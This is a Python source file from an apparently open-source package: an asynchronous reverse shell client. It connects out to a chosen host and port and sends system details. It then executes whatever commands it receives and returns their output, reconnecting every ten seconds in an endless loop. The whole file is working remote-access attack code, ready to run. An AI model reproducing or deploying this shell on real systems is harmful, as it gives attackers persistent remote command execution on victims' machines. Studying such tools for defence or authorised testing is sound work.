#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implement 4 asynchronous tools to execute remote commands
#    Copyright (C) 2020, 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
    This file implement a asynchronous ReverseShellClient.
"""

__all__ = ["ReverseShellClient"]

from os import (
    getcwd,
    getlogin,
    cpu_count,
    get_exec_path,
    getenv,
)
from asyncio import run
from time import sleep
import asyncore
import os
import logging

try:
    from .commons import parse_args, launch_asynchronous_commands
except ImportError:
    from commons import parse_args, launch_asynchronous_commands


class ReverseShellClient(asyncore.dispatcher):

    """
    This class implement an Asynchrone Reverse Shell Client.
    """

    def __init__(self, host: str, port: int):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.connect((host, port))
        self.get_first_buffer()

    def get_first_buffer(self) -> None:

        """
        This method add some banner informations.
        """

        path_exec = "\n\t".join(get_exec_path())
        self.buffer = (
            f"OS utilisé : {os.name}\nNombre de CPU : {cpu_count()}\n"
            f"Chemin d'exécution : \n\t{path_exec}"
        )

    def get_buffer_end(self) -> None:

        """
        This method add the prompt line.
        """

        if os.name == "nt":
            self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}-{getcwd()}>"
        else:
            self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}:{getcwd()}$"

    def handle_close(self) -> None:
        self.close()

    def handle_read(self) -> None:

        """
        Get the command and execute it or close connection.
        """

        commandes = self.recv(65535).decode()
        logging.info(f"Get commands: {commandes}")
        self.buffer = "\n".join(run(launch_asynchronous_commands(commandes)))

        if "\nexit\n" in self.buffer or self.buffer.startswith("exit"):
            logging.warning("Send exit message.")
            self.send(self.buffer.encode())
            self.close()

    def writable(self) -> bool:
        return len(self.buffer) > 0

    def handle_write(self) -> None:

        """
        This method responds to the server (send command output).
        """

        self.get_buffer_end()
        sent = self.send(self.buffer.encode())
        self.buffer = self.buffer[sent:]


def main() -> None:

    """
    This function get arguments and launch ReverseShellClient.
    """

    logging.basicConfig(format="%(asctime)s %(levelname)s : %(message)s")

    host, port = parse_args("ShellServer")

    while True:
        try:
            ReverseShellClient(host, port)
            asyncore.loop()
            sleep(10)
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()
